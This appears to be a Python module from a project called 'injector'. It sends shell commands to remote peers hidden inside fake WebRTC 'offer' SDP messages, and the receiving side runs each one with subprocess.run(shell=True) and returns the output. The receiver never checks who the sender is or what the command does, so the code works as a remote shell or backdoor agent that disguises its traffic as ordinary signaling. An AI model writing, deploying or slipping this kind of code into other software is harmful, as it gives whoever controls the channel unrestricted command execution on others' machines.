#injector/remote_command_handler.py
import asyncio
import json
import subprocess
import uuid



COMMAND_TIMEOUT = 120

class RemoteCommandHandler:
    def __init__(self, signal):
        self.signal = signal
        self._pending_results = {}

        if hasattr(signal, "add_handler"):
            signal.add_handler(self.dispatch_message)
        elif hasattr(signal, "add_message_handler"):
            signal.add_message_handler(self.dispatch_message)        
    

    # SEND COMMAND
    async def send_command(self, target, command, request_id=None, wait_for_result=False, timeout=None):
        if not isinstance(command, str) or not command.strip():
            print("COMMAND MUST BE A NON-EMPTY STRING")
            
        if request_id is None:
            request_id = str(uuid.uuid4())
        
        packet = {
                "type":"offer", "target": target,
                "sdp": json.dumps(
                        {
                            "type": "remote-command",
                            "command": command,
                            "request_id": request_id,
                        }
                    ),
                }
        print(f"SENDING COMMAND REQUEST_ID: {request_id} {target} {command}")
        
        future = None

        if wait_for_result:
            future = asyncio.get_running_loop().create_future()
            self._pending_results[request_id] = future
        await self.signal.send(packet)

        if wait_for_result:
            if future is None:
                raise RuntimeError("RESULT FUTURE WAS NOT CREATED")
            try:
                return await asyncio.wait_for(future, timeout=timeout)
            except asyncio.TimeoutError:
                self._pending_results.pop(request_id, None)
                raise
        return request_id
        

    # MESSAGE ROUTER
    async def dispatch_message(self, message):
        if not isinstance(message, dict):
            print(f"INVALID MESSAGE: {message}")
            return
        
        msg_type = message.get("type")
        if msg_type == "offer":
            await self._handler_offer(message)
        elif msg_type == "answer":
            await self._handle_answer(message)
        elif msg_type == "remote-command":
            await self._process_command_request(message)
        elif msg_type == "remote-command-result":
            await self._handle_command_result(message)


    # OFFER HANDLER
    async def _handler_offer(self, message):
        sdp = message.get("sdp")
        
        if not isinstance(sdp, str):
            return
    
        try:
            payload = json.loads(sdp)
        except json.JSONDecodeError:
            print("INVALID JSON SDP")
            return

        if payload.get("type") != "remote-command":
            return

    
        request = {"sender": message.get("sender"), "command": payload.get("command"), "request_id": payload.get("request_id")}
        await self._process_command_request(request)


    # ANSWER HANDLER
    async def _handle_answer(self, message):
        sdp = message.get("sdp")

        if not isinstance(sdp, str):
            return

        try:
            payload = json.loads(sdp)
        except json.JSONDecodeError:
            print("[!] INVALID JSON ANSWER")
            return

        if payload.get("type") == "remote-command-result":
            await self._handle_command_result(payload)


    # COMMAND EXECUTION
    async def _process_command_request(self, message):
        sender = message.get("sender")
        command = message.get("command")
        request_id = message.get("request_id")
  
        if not isinstance(command, str) or not command.strip():
            await self._send_result(sender, request_id, "ERROR", error="INVALID COMMAND")
            return

        print(f"EXECUTING COMMAND FROM {sender} : {command}")

        status, output, error = await self._execute_command(command)
        await self._send_result(sender, request_id, status, output=output, error=error)


    # EXECUTE COMMAND
    async def _execute_command(self, command):
        try:
            completed = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=120)
        except subprocess.TimeoutExpired:
            return ("error", None, "COMMAND TIMEOUT")
        except Exception as exc:
            print("[!] EXECUTION FAILED")
            return("error", None, str(exc))
        
        output = completed.stdout + completed.stderr


        if completed.returncode == 0:
            return ("success", output or "COMMAND EXECUTED SUCCESSFULLY", None)
        return ("error", None, output or "COMMAND FAILED")



    # RESULT HANDLING
    async def _handle_command_result(self, message):
        request_id = message.get("request_id")
        
        if request_id is None:
            return

        future = self._pending_results.pop(request_id, None)
        if future and not future.done():
            future.set_result(message)


    # RESPONSE SENDER
    async def _send_result(self, target, request_id, status, output=None, error=None):
        payload = {"type": "remote-command-result", "request_id": request_id, "status": status}

        if output is not None:
            payload["output"] = output
        if error is not None:
            payload["error"] = error

        packet = {"type": "answer", "target": target, "sdp": json.dumps(payload)}

        print(f"SENDING RESULT REQUEST_ID: {request_id} : STATUS: {status}")
        await self.signal.send(packet)

